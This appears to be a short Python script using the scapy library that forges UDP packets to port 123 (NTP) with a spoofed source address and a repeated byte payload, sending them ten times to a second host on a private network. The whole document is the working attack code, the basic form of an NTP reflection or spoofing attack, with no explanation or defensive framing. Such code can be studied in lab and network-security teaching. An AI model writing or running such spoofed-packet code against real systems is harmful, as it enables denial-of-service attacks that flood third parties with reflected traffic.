from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"
C= '\x1e\x0c\x00\x01' * 12

spoofed_packet = IP(src=A, dst=B) / UDP(sport=RandShort(), dport=123) / C
send(spoofed_packet, count=10)